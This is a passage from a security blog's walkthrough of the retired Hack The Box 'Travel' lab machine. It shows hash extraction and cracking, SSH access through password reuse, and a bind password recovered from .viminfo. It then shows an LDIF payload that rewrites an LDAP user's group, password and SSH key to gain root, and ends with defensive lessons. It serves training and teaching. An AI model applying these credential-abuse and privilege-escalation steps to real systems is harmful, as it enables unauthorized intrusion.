+</code></pre>
+<p><strong>Indicators of a container:</strong></p>
+<ul>
+<li><code>.dockerenv</code> file exists</li>
+<li>Hostname is <code>blog</code> (not <code>travel</code>)</li>
+<li>IP is in the Docker range (<code>172.30.0.10/24</code>)</li>
+<li>Limited process list</li>
+</ul>
+<p><strong>The Hacker Mindset:</strong>
+Containers are sandboxed, but they often share resources with the host. Look for:</p>
+<ul>
+<li>Mounted host directories</li>
+<li>Network access to host services</li>
+<li>Credential files or backups that were copied into the container</li>
+</ul>
+<h3 id="5-2-finding-the-database-backup">5.2 Finding the Database Backup</h3>
+<pre><code class="language-bash" data-language="bash">www-data@blog:/$ ls -la /opt/wordpress/
+backup-13-04-2020.sql
+</code></pre>
+<p><strong>Why is this here?</strong>
+This is a <strong>snapshot of the database from before deployment</strong>. Developers often create backups during migrations or before updates, then forget to remove them. The file is readable by any user.</p>
+<pre><code class="language-bash" data-language="bash">cat /opt/wordpress/backup-13-04-2020.sql | tail -n 20
+</code></pre>
+<p><strong>Discovery:</strong></p>
+<pre><code class="language-sql" data-language="sql">INSERT INTO `wp_users` VALUES 
+(1,'admin','$P$BIRXVj/ZG0YRiBH8gnRy0chBx67WuK/','admin','admin@travel.htb',...),
+(2,'lynik-admin','$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.','lynik-admin','lynik@travel.htb',...);
+</code></pre>
+<h3 id="5-3-understanding-the-hash-format">5.3 Understanding the Hash Format</h3>
+<p>The hash <code>$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.</code> is a <strong>WordPress/phppass</strong> hash:</p>
+<ul>
+<li><code>$P$</code> = phpass identifier</li>
+<li><code>B/</code> = iteration count log2 (encoded)</li>
+<li>The rest = salt + hash</li>
+</ul>
+<p><strong>Why crack this?</strong>
+<code>lynik-admin</code> sounds like a system user, not just a WordPress user. If we can crack this, we might be able to <strong>reuse the password</strong> for SSH.</p>
+<h3 id="5-4-cracking-the-hash">5.4 Cracking the Hash</h3>
+<pre><code class="language-bash" data-language="bash"># On Kali
+echo 'lynik-admin:$P$B/wzJzd3pj/n7oTe2GGpi5HcIl4ppc.' &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+</code></pre>
+<p><strong>How password cracking works:</strong>
+John (or Hashcat) takes each password from the wordlist, hashes it with the same algorithm and salt, and compares it to the target hash. <code>rockyou.txt</code> contains ~14 million real passwords leaked from the RockYou breach in 2009. It's the most effective wordlist for common passwords.</p>
+<p><strong>Result:</strong> <code>1stepcloser</code></p>
+<hr />
+<h2 id="phase-6-moving-to-the-host-via-ssh">Phase 6: Moving to the Host via SSH</h2>
+<h3 id="6-1-why-ssh">6.1 Why SSH?</h3>
+<p>We could try to escape the container via kernel exploits or mounted volumes, but those are unreliable. <strong>Credential reuse</strong> is much faster. If <code>lynik-admin</code> uses the same password for SSH, we can walk right out of the container.</p>
+<pre><code class="language-bash" data-language="bash">ssh lynik-admin@10.129.2.151
+# password: null
+</code></pre>
+<p><strong>Why it works:</strong>
+The SSH server is configured to allow password authentication for <code>lynik-admin</code> (and <code>trvl-admin</code>), while everyone else must use keys. This is visible in <code>/etc/ssh/sshd_config</code>:</p>
+<pre><code>PasswordAuthentication no
+Match User trvl-admin,lynik-admin
+    PasswordAuthentication yes
+</code></pre>
+<h3 id="6-2-grabbing-the-user-flag">6.2 Grabbing the User Flag</h3>
+<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat user.txt
+9aecc[redacted]fdbffb07
+</code></pre>
+<hr />
+<h2 id="phase-7-privilege-escalation-to-root-via-ldap">Phase 7: Privilege Escalation to Root via LDAP</h2>
+<h3 id="7-1-finding-ldap-credentials">7.1 Finding LDAP Credentials</h3>
+<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat ~/.ldaprc
+HOST ldap.travel.htb
+BASE dc=travel,dc=htb
+BINDDN cn=lynik-admin,dc=travel,dc=htb
+</code></pre>
+<p>This file tells the LDAP client how to connect. But the password is REDACTED</p>
+<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat ~/.viminfo
+</code></pre>
+<p>Inside <code>.viminfo</code>, we find:</p>
+<pre><code>""1	LINE	0
+	BINDPW Theroadlesstraveled
+</code></pre>
+<p><strong>What is <code>.viminfo</code>?</strong>
+Vim stores history, registers, and deleted text in <code>.viminfo</code>. The developer edited <code>.ldaprc</code>, deleted the <code>BINDPW</code> line, saved the file, but <strong>Vim remembered the deletion</strong>. This is a classic OPSEC failure.</p>
+<h3 id="7-2-ldap-enumeration">7.2 LDAP Enumeration</h3>
+<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ ldapsearch -x -w Theroadlesstraveled
+</code></pre>
+<p><strong>What this shows:</strong></p>
+<ul>
+<li>The domain: <code>dc=travel,dc=htb</code></li>
+<li>Users in <code>ou=users,ou=linux,ou=servers,dc=travel,dc=htb</code></li>
+<li>Groups in <code>ou=groups,ou=linux,ou=servers,dc=travel,dc=htb</code></li>
+<li><code>lynik-admin</code> is an <strong>LDAP administrator</strong></li>
+</ul>
+<p><strong>Why this matters:</strong>
+As an LDAP admin, we have <strong>write access</strong> to user attributes. In environments where SSH authenticates against LDAP, modifying LDAP is equivalent to modifying <code>/etc/passwd</code> and <code>/etc/shadow</code>.</p>
+<h3 id="7-3-understanding-the-ssh-ldap-integration">7.3 Understanding the SSH/LDAP Integration</h3>
+<pre><code class="language-bash" data-language="bash">lynik-admin@travel:~$ cat /etc/ssh/sshd_config | grep -v '^#' | grep .
+AuthorizedKeysCommand /usr/bin/sss_ssh_authorizedkeys
+AuthorizedKeysCommandUser nobody
+PasswordAuthentication no
+Match User trvl-admin,lynik-admin
+    PasswordAuthentication yes
+</code></pre>
+<p><strong>How this works:</strong></p>
+<ul>
+<li><code>AuthorizedKeysCommand</code> runs <code>/usr/bin/sss_ssh_authorizedkeys</code> when someone tries to SSH with a key</li>
+<li>This program queries <strong>LDAP</strong> for the <code>sshPublicKey</code> attribute</li>
+<li>If the key matches, SSH allows login</li>
+<li><code>PasswordAuthentication no</code> means most users <strong>must</strong> use keys</li>
+</ul>
+<p><strong>The implication:</strong>
+If we add an <code>sshPublicKey</code> attribute to any LDAP user, we can SSH as them. If we also set their <code>gidNumber</code> to <code>27</code> (the <code>sudo</code> group) and give them a password, we can <code>sudo su -</code> to root.</p>
+<h3 id="7-4-why-we-can-t-just-modify-root">7.4 Why We Can't Just Modify Root</h3>
+<pre><code class="language-bash" data-language="bash">cat /etc/sssd/sssd.conf
+</code></pre>
+<pre><code class="language-ini" data-language="ini">[nss]
+filter_users = root
+filter_groups = root
+</code></pre>
+<p>SSSD (System Security Services Daemon) explicitly <strong>filters out root</strong> from LDAP lookups. The system is designed to prevent exactly the attack we're attempting on root. So we pick another user.</p>
+<h3 id="7-5-the-target-johnny">7.5 The Target: Johnny</h3>
+<p>We pick <code>johnny</code> (uid=5004) arbitrarily — any user in the LDAP <code>users</code> OU would work. Our goal is three modifications:</p>
+<ol>
+<li><strong>Add SSH key</strong> so we can log in</li>
+<li><strong>Change <code>gidNumber</code> to 27</strong> so he's in the <code>sudo</code> group</li>
+<li><strong>Set <code>userPassword</code></strong> so we can authenticate with <code>sudo</code></li>
+</ol>
+<h3 id="7-6-understanding-ldif-ldap-data-interchange-format">7.6 Understanding LDIF (LDAP Data Interchange Format)</h3>
+<p>An LDIF file describes changes to LDAP entries. The format is strict:</p>
+<pre><code class="language-ldif" data-language="ldif">dn: &lt;distinguished name&gt;
+changeType: modify
+&lt;operation&gt;: &lt;attribute&gt;
+&lt;attribute&gt;: &lt;value&gt;
+-
+</code></pre>
+<ul>
+<li><code>dn</code> = the full path to the object in LDAP</li>
+<li><code>changeType: modify</code> = we're editing, not creating</li>
+<li><code>replace:</code> = overwrite existing value</li>
+<li><code>add:</code> = add new attribute</li>
+<li><code>-</code> = separator between operations</li>
+</ul>
+<h3 id="7-7-creating-the-payload-ldif">7.7 Creating the Payload LDIF</h3>
+<pre><code class="language-ldif" data-language="ldif">dn: uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb
+changeType: modify
+replace: gidNumber
+gidNumber: 27
+-
+replace: userPassword
+userPassword: hacked123
+-
+add: objectClass
+objectClass: ldapPublicKey
+-
+add: sshPublicKey
+sshPublicKey: ssh-rsa [redacted encoded lab material] kali@kali
+</code></pre>
+<p><strong>Why we need <code>ldapPublicKey</code>:</strong>
+The <code>sshPublicKey</code> attribute isn't valid for all object classes. We must first add the <code>ldapPublicKey</code> object class to the user's entry, which then allows the <code>sshPublicKey</code> attribute.</p>
+<h3 id="7-8-applying-the-ldap-changes">7.8 Applying the LDAP Changes</h3>
+<pre><code class="language-bash" data-language="bash">ldapadd -D "cn=lynik-admin,dc=travel,dc=htb" -w Theroadlesstraveled -f /dev/shm/johnny.ldif
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>modifying entry "uid=johnny,ou=users,ou=linux,ou=servers,dc=travel,dc=htb"
+</code></pre>
+<h3 id="7-9-verifying-the-changes">7.9 Verifying the Changes</h3>
+<pre><code class="language-bash" data-language="bash">/usr/bin/sss_ssh_authorizedkeys johnny
+</code></pre>
+<p>This should print the SSH public key we just added, confirming SSH will accept it.</p>
+<h3 id="7-10-ssh-as-johnny">7.10 SSH as Johnny</h3>
+<pre><code class="language-bash" data-language="bash"># On Kali
+ssh -i /tmp/travel_key johnny@10.129.2.151
+</code></pre>
+<p><strong>What happens:</strong></p>
+<ul>
+<li>SSH connects to the server</li>
+<li>The server runs <code>sss_ssh_authorizedkeys johnny</code></li>
+<li>This queries LDAP, finds our key</li>
+<li>Authentication succeeds</li>
+<li>We log in as <code>johnny</code></li>
+</ul>
+<pre><code class="language-bash" data-language="bash">johnny@travel:~$ id
+uid=5004(johnny) gid=27(sudo) groups=27(sudo),5000(domainusers)
+</code></pre>
+<p><strong>The <code>gid=27(sudo)</code> is the key.</strong> Johnny is now a member of the sudo group.</p>
+<h3 id="7-11-becoming-root">7.11 Becoming Root</h3>
+<pre><code class="language-bash" data-language="bash">johnny@travel:~$ sudo su -
+[sudo] password for johnny: hacked123
+root@travel:~#
+</code></pre>
+<p><strong>Why <code>sudo su -</code> works:</strong></p>
+<ul>
+<li>The <code>sudo</code> group is defined in <code>/etc/sudoers</code> as having full sudo access</li>
+<li>Johnny's password is REDACTED (stored in LDAP, synced by SSSD)</li>
+<li><code>su -</code> switches to root and loads root's environment</li>
+</ul>
+<h3 id="7-12-the-root-flag">7.12 The Root Flag</h3>
+<pre><code class="language-bash" data-language="bash">root@travel:~# cat /root/root.txt
+4b10d5[redacted]ff045abc5
+</code></pre>
+<hr />
+<h2 id="phase-8-lessons-learned-and-defense">Phase 8: Lessons Learned &amp; Defense</h2>
+<h3 id="key-vulnerabilities-exploited">Key Vulnerabilities Exploited</h3>
+<ol>
+<li><strong>Exposed <code>.git</code> directory</strong> → Always remove <code>.git</code> before deployment, or block it in web server config</li>
+<li><strong>SSRF via curl</strong> → Never pass user input directly to curl. Use allowlists for URLs</li>
+<li><strong>Weak SSRF filter</strong> → Blocklists fail. Use URL parsers and verify against an allowlist of domains</li>
+<li><strong>PHP deserialization</strong> → Don't store user-controlled data in caches that get deserialized. Use JSON instead of PHP serialization</li>
+<li><strong>Database backups in web root</strong> → Backups should never be in publicly accessible directories</li>
+<li><strong>Password reuse</strong> → Never reuse passwords across systems</li>
+<li><strong>Viminfo leakage</strong> → Sensitive edits should use <code>set viminfo=</code> or editors that don't log history</li>
+<li><strong>LDAP without proper access controls</strong> → LDAP admins should be heavily restricted; monitor for unauthorized modifications</li>
+</ol>
+<h3 id="the-hacker-mindset-recap">The Hacker Mindset Recap</h3>
+<ul>
+<li><strong>Enumeration is everything.</strong> We found three vhosts, then a <code>.git</code> directory, then source code, then a vulnerability chain.</li>
+<li><strong>Read the source.</strong> The code told us exactly how the cache key was generated and exactly how to bypass the filter.</li>
+<li><strong>Think in chains.</strong> No single bug gave us root. It took SSRF → cache poisoning → deserialization → credential reuse → LDAP manipulation.</li>
+<li><strong>Never give up on 403s.</strong> A forbidden directory listing doesn't mean forbidden files.</li>
+<li><strong>Check everything.</strong> <code>.viminfo</code> is often overlooked but contains deleted credentials.</li>
+</ul>
+<hr />
+<h2 id="flags">Flags</h2>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Location</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>User</td>
+<td><code>/home/lynik-admin/user.txt</code></td>
+<td><code>9aecceb[redacted]bffb07</code></td>
+</tr>
+<tr>
+<td>Root</td>
+<td><code>/root/root.txt</code></td>
+<td><code>4b10d5[redacted]f045abc5</code></td>
+</tr>
+</tbody></table>
+<hr />
+<p><em>Happy hacking. Stay curious. Think like a developer, break like an attacker.</em></p>
+8:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$d"}}]
+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-trick-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Trick Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-thenotebook-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: TheNotebook Walkthrough"}]]}]}]]}]
+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T516,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/#article","headline":"Hack The Box: Travel Walkthrough","description":"An archived walkthrough of the retired Hack The Box Travel machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/","datePublished":"2026-06-11T10:54:17.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":3609,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/3aee13cd377cbe7fe3c4c69c628157d7840f7800/HTB-Travel.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-travel-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Travel Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-travel-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
